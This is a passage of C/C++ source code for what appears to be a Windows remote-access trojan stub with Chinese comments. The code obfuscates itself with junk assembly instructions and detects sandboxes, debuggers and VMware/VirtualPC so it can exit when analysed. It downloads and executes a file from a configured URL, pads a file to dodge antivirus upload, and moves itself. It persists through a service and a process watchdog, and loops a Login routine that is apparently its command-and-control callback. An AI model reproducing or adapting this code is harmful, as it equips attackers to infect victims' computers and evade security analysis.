		push 2
		_asm inc eax;
		_asm dec ebx;
		_asm dec eax;
		_asm inc ebx;
		call Address

			mov hkz, eax

	}

	pe.dwSize = sizeof(PROCESSENTRY32);

	if (Process32First(hkz, &pe))

	{

		do

		{

			if (pe.th32ProcessID == pid)

			{
				_asm inc eax;
				_asm dec ebx;
				_asm dec eax;
				_asm inc ebx;
				ParentProcessID = pe.th32ParentProcessID;

				break;

			}

		} while (Process32Next(hkz, &pe));

	}

	return ParentProcessID;

}

DWORD get_explorer_processid()

{
	_asm inc eax;
	_asm dec ebx;
	_asm dec eax;
	_asm inc ebx;
	DWORD explorer_id = -1;

	PROCESSENTRY32 pe;

	HANDLE hkz;

	HMODULE hModule = LoadLibrary(_T("Kernel32.dll"));

	if (hModule == NULL)

	{
		_asm inc eax;
		_asm dec ebx;
		_asm dec eax;
		_asm inc ebx;

		OutputDebugString(_T("Loaddll error"));

		return-1;

	}

	FARPROC Address = GetProcAddress(hModule, "CreateToolhelp32Snapshot");
	_asm inc eax;
	_asm dec ebx;
	_asm dec eax;
	_asm inc ebx;
	if (Address == NULL)

	{

		OutputDebugString(_T("GetProc error"));

		return-1;

	}

	_asm

	{

		push 0

		push 2

		call Address

		mov hkz, eax
		_asm inc eax;
		_asm dec ebx;
		_asm dec eax;
		_asm inc ebx;
	}

	pe.dwSize = sizeof(PROCESSENTRY32);

	if (Process32First(hkz, &pe))

	{

		do

		{
			_asm inc eax;
			_asm dec ebx;
			_asm dec eax;
			_asm inc ebx;
			if (_stricmp(pe.szExeFile, "explorer.exe") == 0)

			{

				explorer_id = pe.th32ProcessID;

				break;

			}

		} while (Process32Next(hkz, &pe));

	}
	_asm inc eax;
	_asm dec ebx;
	_asm dec eax;
	_asm inc ebx;
	return explorer_id;

}
BOOL IsGuardPages()
{
	SYSTEM_INFO sSysInfo;
	DWORD dwPageSize = 0;
	DWORD OldProtect = 0;
	GetSystemInfo(&sSysInfo);
	dwPageSize = sSysInfo.dwPageSize;
	LPVOID lpvBase = VirtualAlloc(NULL, dwPageSize, MEM_COMMIT, PAGE_READWRITE);
	if (lpvBase == NULL)
	{
		return FALSE;
	}
	PBYTE lptmpB = (PBYTE)lpvBase;
	*lptmpB = 0xc3; //retn
	VirtualProtect(lpvBase, dwPageSize, PAGE_EXECUTE_READ | PAGE_GUARD, &OldProtect);
	__try
	{
		__asm  call dword ptr[lpvBase];
		VirtualFree(lpvBase, 0, MEM_RELEASE);
		return TRUE;
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		VirtualFree(lpvBase, 0, MEM_RELEASE);
		return FALSE;
	}
}
//==========================================
BOOL gInVMWARE, gInVirtualPC;

BOOL VMWareTest()
{
	BYTE PortValue1, PortValue2;
	__try
	{
		__asm
		{
			pushad
			pushfd
			xor ebx, ebx
			mov ecx, 0xa
			mov eax, 'VMXh'; EAX = magic    //564D5868
			mov dx, 'VX'; DX = magic
			in eax, dx; specially processed io cmd
			cmp ebx, 'VMXh'; also eax / ecx modified(maybe vmw / os ver ? )
			sete al;
			movzx eax, al
				mov gInVMWARE, eax;
			popfd
				popad
		}
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		gInVMWARE = FALSE;
	}
	return gInVMWARE;
}

BOOL VirtualPCTest()
{
	__try
	{
		__asm
		{
			pushad
			mov ebx, 0 // Flag
			mov eax, 1 // VPC function number
			__emit 0Fh
			__emit 3Fh
			__emit 07h
			__emit 0Bh
			test ebx, ebx
			sete al
			movzx eax, al
			mov gInVirtualPC, eax;
			popad
		}

	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		gInVirtualPC = FALSE;
	}
	return gInVirtualPC;
}

BOOL VMTest()
{
	ULONG xdt = 0;
	ULONG InVM = 0;
	__asm
	{
		push edx
		sidt[esp - 2]
		pop edx
		nop
		mov xdt, edx
	}
	//    printf("idt = %08x\n" , xdt);
	if (xdt > 0xd0000000)
	{
		//printf("IDT Test :running in vm!\n");
		InVM = 1;
	}
	else
	{
		InVM = 0;
	}
	__asm
	{
		push edx
		sgdt[esp - 2]
		pop edx
		nop
		mov xdt, edx
	}

	//    printf("gdt = %08x\n" , xdt);

	if (xdt > 0xd0000000)
	{
		InVM += 1;
	}
	else
	{
		InVM += 0;
	}
	return InVM;
}
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <shellapi.h>
#include <ctime>
void fangshangchuan()   //fsc //防上传
{

	int i = 0;
	char a[25];
	FILE* fp = fopen("1.exe", "a+"); //以二进制写的方式打开文件

	for (int j = 1; j < 100000; j++)
	{
		srand((unsigned)time(NULL));
		a[1] = rand();
		fwrite(a, sizeof(a), 1, fp);
	}
	fclose(fp);
	ShellExecute(NULL, "open", "1.exe", NULL, NULL, SW_SHOWNORMAL);
	//	return 0;
}
//======================================
#include <UrlMon.h>
#pragma comment(lib, "urlmon.lib")
bool OpenFile1(LPCTSTR lpFile, INT nShowCmd)
{
	char	lpSubKey[500];
	HKEY	hKey;
	char	strTemp[MAX_PATH];
	LONG	nSize = sizeof(strTemp);
	char* lpstrCat = NULL;
	memset(strTemp, 0, sizeof(strTemp));

	const char* lpExt = strrchr(lpFile, '.');
	if (!lpExt)
		return false;

	if (RegOpenKeyEx(HKEY_CLASSES_ROOT, lpExt, 0L, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
		return false;
	RegQueryValue(hKey, NULL, strTemp, &nSize);
	RegCloseKey(hKey);
	memset(lpSubKey, 0, sizeof(lpSubKey));
	wsprintf(lpSubKey, "%s\\shell\\open\\command", strTemp);

	if (RegOpenKeyEx(HKEY_CLASSES_ROOT, lpSubKey, 0L, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
		return false;
	memset(strTemp, 0, sizeof(strTemp));
	nSize = sizeof(strTemp);
	RegQueryValue(hKey, NULL, strTemp, &nSize);
	RegCloseKey(hKey);

	lpstrCat = strstr(strTemp, "\"%1");
	if (lpstrCat == NULL)
		lpstrCat = strstr(strTemp, "%1");

	if (lpstrCat == NULL)
	{
		lstrcat(strTemp, " ");
		lstrcat(strTemp, lpFile);
	}
	else
		lstrcpy(lpstrCat, lpFile);

	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi;
	si.cb = sizeof si;
	if (nShowCmd != SW_HIDE)
		si.lpDesktop = "WinSta0\\Default";

	CreateProcess(NULL, strTemp, NULL, NULL, false, 0, NULL, NULL, &si, &pi);

}

BOOL CheckFileExist2(LPCTSTR lpszPath)
{
	if (GetFileAttributes(lpszPath) == 0xFFFFFFFF && GetLastError() == ERROR_FILE_NOT_FOUND) {
		return FALSE;
	}
	else {
		return TRUE;
	}
}
DWORD WINAPI Loop_DownManager1(LPVOID lparam)
{
	int	nUrlLength;
	char* lpURL = NULL;
	char* lpFileName = NULL;
	nUrlLength = strlen((char*)lparam);
	if (nUrlLength == 0)
		return false;

	lpURL = (char*)malloc(nUrlLength + 1);

	memcpy(lpURL, lparam, nUrlLength + 1);

	lpFileName = strrchr(lpURL, '/') + 1;
	if (lpFileName == NULL)
		return false;
	char szFile[512] = { 0 };
	wsprintf(szFile, "c:\\%s", lpFileName);

	HRESULT hr = URLDownloadToFile(NULL, lpURL, szFile, 0, NULL);
	if (hr == S_OK) {
		if (!CheckFileExist2(szFile))
			return false; //文件下载成功，但是文件不存在，很可能被杀毒软件查杀
	}
	else if (hr == INET_E_DOWNLOAD_FAILURE)
		return false;    //URL 不正确，文件下载失败	
	else
		return false; //文件下载失败，请检查URL是否正确

	OpenFile1(szFile, SW_SHOW);



	return true;
}









int main()
{
	
	RaiseToDebugP();  //提权函数
//-----------------------------------------------------//捆绑地址
	if (modify_data.szDownRun != NULL)
	{
		MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_DownManager1,
			(LPVOID)modify_data.szDownRun, 0, NULL, true);

	}





	//-----------------------------------------------------//自删除
	if (modify_data.Dele_te == 1)
	{
		char Time[64];
		char	strSelf[MAX_PATH];
		memset(strSelf, 0, sizeof(strSelf));
		GetModuleFileName(NULL, strSelf, sizeof(strSelf));
		char Windows[256];
		SHGetSpecialFolderPath(NULL, Windows, 43, FALSE);
		//	GetWindowsDirectory(Windows,sizeof(Windows));
		lstrcat(Windows, "\\");
		char* lpTime = Time;
		lstrcat(Windows, lpTime);
		strcat(Windows, ".exe");
		MoveFile(strSelf, Windows);


	}
	else
	{
		char	strSelf[MAX_PATH];
		memset(strSelf, 0, sizeof(strSelf));
		GetModuleFileName(NULL, strSelf, sizeof(strSelf));
	}
	//-----------------------------------------------------K终结者
	if (modify_data.Zjz == 1)  //检查是否K终结者
	{
	//	MessageBox(NULL, "K终结者进程", NULL, NULL);
		KProcess(); //K终结者进程
	}

	//-----------------------------------------------------//防分析
	if (modify_data.Dele_fs == 1)
	{
		//MessageBox(NULL, "防分析", NULL, NULL);
		OutputDebugString("Dele_fs");
		DWORD explorer_id = get_explorer_processid();
		DWORD parent_id = get_parent_processid(GetCurrentProcessId());
		if (!explorer_id == parent_id)//判断父进程id是否和explorer进程id相同
		{
			ExitProcess(0);
			return 0;
		}

	}

	//-----------------------------------------------------反哈勃分析
	if (modify_data.Fhb == 1)
	{
		//MessageBox(NULL, "反哈勃分析", NULL, NULL);
		if (IsGuardPages())
		{
			exit(0);
			ExitProcess(0);
		}

	}

	//-----------------------------------------------------反虚拟机上线

	if (modify_data.Fvm == 1)
	{
		//MessageBox(NULL, "反虚拟机上线", NULL, NULL);
		if (VMWareTest())
		{
			//   printf("In Vmware !!!");
			exit(0);
			ExitProcess(0);
		}
		else
			if (VirtualPCTest())
			{
				//   printf("In VirtualPC!!!!");
				exit(0);
				ExitProcess(0);
			}
			else
				if (VMTest())
				{
					//   printf("In VM !");
					exit(0);
					ExitProcess(0);
				}
	}
	//-----------------------------------------------------360防上传
	if (modify_data.fsc == 1)  //360防上传
	{
		//MessageBox(NULL, "360防上传", NULL, NULL);
		fangshangchuan(); //K终结者进程
	}

	//-----------------------------------------------------是否捆绑
// 	if (modify_data.szDownRun != NULL)//是否捆绑
// 	{
// 		http_get(modify_data.szDownRun,"C:\\ProgramData\\");
// 	}

	//-----------------------------------------------------
	//-----------------------------------------------------
	//-----------------------------------------------------
	//-----------------------------------------------------
	if (modify_data.bLanPenetrate == 1)  ////超级复活
	{
	//	MessageBox(NULL, "超级复活", NULL, NULL);
		LocalParam lpLp;
		ZeroMemory(&lpLp, sizeof(LocalParam));
		CHAR szRemoteProcName[MAX_LENGTH] = "\0";
		CHAR szLocalProcName[MAX_LENGTH] = "\0";
		CHAR currentFilePath[MAX_LENGTH] = "\0";
		vector<string> pathGroup;
		GetModuleFileName(NULL, currentFilePath, sizeof(currentFilePath));
		SplitString(currentFilePath, pathGroup, "\\");
		StringCchCopy(szLocalProcName, sizeof(szLocalProcName), pathGroup[pathGroup.size() - 1].c_str());
		StringCchCopy(szRemoteProcName, sizeof(szRemoteProcName), "notepad.exe");//notepad.exe可能更好
		StringCchCopy(szLocalProcName, sizeof(szLocalProcName), szLocalProcName);
		StringCchCopy(lpLp.remoteProcName, sizeof(lpLp.remoteProcName), szRemoteProcName);
		DWORD dwRemotePid = GetProcessID(szRemoteProcName);
		DWORD dwLocalPid = GetProcessID(szLocalProcName);
		HANDLE hThread = NULL;
		lpLp.remotePid = dwRemotePid;
		lpLp.localPid = dwLocalPid;
		hThread = CreateThread(NULL, 0, WatchFuncData, LPVOID(&lpLp), 0, 0);
		//....插入恶意代码等工作流程
		while (TRUE)
		{
			qidx();
			HANDLE hPS = OpenProcess(PROCESS_ALL_ACCESS, false, GetCurrentProcessId());
			SetPriorityClass(hPS, HIGH_PRIORITY_CLASS);//设置进程优先级
			CloseHandle(hPS);
			OutputDebugString("Sleep(1000) Login");
			HANDLE hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Login, NULL, 0, NULL, true);
			WaitForSingleObject(hThread, INFINITE);
			CloseHandle(hThread);
			//	MessageBox(NULL, "Hello!!", "HAHA!! XDD", MB_OK);
		}
		WaitForSingleObject(hThread, INFINITE);
	}
	//===========================================================================





		/////////////////////////////////////////////





	if (modify_data.bService == 1)
	{
		// 	MessageBox(NULL,"服务启动",NULL,NULL);
		// 
		// 	MessageBox(NULL,modify_data.SerName,NULL,NULL);
		// 	MessageBox(NULL,modify_data.Serdisplay,NULL,NULL);
		// 	MessageBox(NULL,modify_data.Serdesc,NULL,NULL);
		// 	MessageBox(NULL,modify_data.ReleasePath,NULL,NULL);
		// 	MessageBox(NULL,modify_data.ReleaseName,NULL,NULL);

		if (service_is_exist())
		{
			SERVICE_TABLE_ENTRY serviceTable[] =
			{
				{modify_data.SerName,(LPSERVICE_MAIN_FUNCTION)ServiceMain},
				{NULL,NULL}
			};
			StartServiceCtrlDispatcher(serviceTable);

		}
		else
		{
			RunService(modify_data.SerName, modify_data.Serdisplay, modify_data.Serdesc);
			ExitProcess(0);
			Sleep(500);
		}
		WSADATA Data;
		WSAStartup(0x202, &Data);
		while (1)
		{
			HANDLE hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Login, NULL, 0, NULL);
			WaitForSingleObject(hThread, INFINITE);
			CloseHandle(hThread);
			while (1)
			{
				Sleep(1000 * 1000);
			}
		}

	}


	if (modify_data.bRunOnce == 1)
	{
	//	MessageBox(NULL, "绿色安装", NULL, NULL);
		HANDLE hPS = OpenProcess(PROCESS_ALL_ACCESS, false, GetCurrentProcessId());
		SetPriorityClass(hPS, HIGH_PRIORITY_CLASS);//设置进程优先级
		CloseHandle(hPS);
		OutputDebugString("Sleep(1000) Login");
		HANDLE hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Login, NULL, 0, NULL, true);
		WaitForSingleObject(hThread, INFINITE);
		CloseHandle(hThread);
	}
	if (modify_data.bRuns == 1)
	{
		//MessageBox(NULL, "启动目录启动", NULL, NULL);
		qidx();
		HANDLE hPS = OpenProcess(PROCESS_ALL_ACCESS, false, GetCurrentProcessId());
		SetPriorityClass(hPS, HIGH_PRIORITY_CLASS);//设置进程优先级
		CloseHandle(hPS);
		OutputDebugString("Sleep(1000) Login");
		HANDLE hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Login, NULL, 0, NULL, true);
		WaitForSingleObject(hThread, INFINITE);
		CloseHandle(hThread);
	}

	return 0;











}